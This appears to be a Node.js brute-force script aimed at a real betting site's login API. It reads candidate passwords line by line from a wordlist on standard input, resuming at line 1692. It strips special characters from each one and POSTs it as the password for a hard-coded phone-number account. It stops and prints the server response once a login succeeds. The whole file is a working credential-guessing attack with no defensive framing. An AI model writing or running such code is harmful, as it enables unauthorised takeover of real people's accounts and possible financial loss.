var request = require("request");
///!Q@W#E$R%T^Y&U*I(O)P_{+}

var phone = 0721123456;

process.stdin.resume();
process.stdin.setEncoding('ascii');

var input_stdin = "";
var input_stdin_array = "";
var input_currentline = 0;

process.stdin.on('data', function (data) {
    input_stdin += data;
});

process.stdin.on('end', function () {
    input_stdin_array = input_stdin.split("\n");
	input_currentline =1692;
	console.log("starting at " +input_currentline);
    main();   
});
//process.on('SIGINT', function () {
 // console.log('Over and Out!');
 // process.exit(0);
// input_stdin_array = input_stdin.split("\n");
//    main(); 
//});

function readLine() {
    return input_stdin_array[input_currentline++];
}

/////////////// ignore above this line ////////////////////

function main() {
    var n = input_stdin_array.length;
//	for(x=0;x<n;x++){
//		var input = readLine();
		//console.log(`${input}`);
//	}
    //arr = readLine().split('');
    //arr = arr.map(Number);
	if(input_currentline>= n){
		console.log("completed file");
		return;
	}
var input = readLine().trim().toString();//encodeURI(
//input = input.replace(/(["])/g, "\\$1");
//input = input.replace(/(['])/g, "\\$1");
input =input.slice(0,10);
input = input.replace(/[`~!@#$%^&*()_|+\-=?;:'",.<>\{\}\[\]\\\/]/gi, '');
	var p = new Promise(function(resolve, reject) {
	// Do an async task async task and then...
	//POST https://sportpesa.com/bets/login/ password username
	//https://app.sportpesa.com:3031/player/v1/login  usr: '0724654695', pwd:`${input}` 
	

var options = { method: 'POST',  url: 'https://app.sportpesa.com:3031/player/v1/login',
  headers: 
   { 'postman-token': '1e0a1728-c694-33ab-9cb8-fc18dd6e36d1',
     'cache-control': 'no-cache',
     'content-type': 'multipart/form-data; boundary=---011000010111000001101001' },
  formData: { usr: phone, pwd:`${input}` } };
 console.log(options.formData);
request(options, function (error, response, body) {
  if (error) throw new Error(error);
  var jsonBody = JSON.parse(body);
  if(!jsonBody.errorDescription){//success
	 console.log(body);
	  reject('complete!');
  }
	  resolve('next guy!');
});

});

p.then(function() { 
	/* do something with the result */
	main();
}).catch(function(a) {
	/* error :( */
	console.log("error " + a);
})
	
}
function crack(remaining,input){
	
	
}

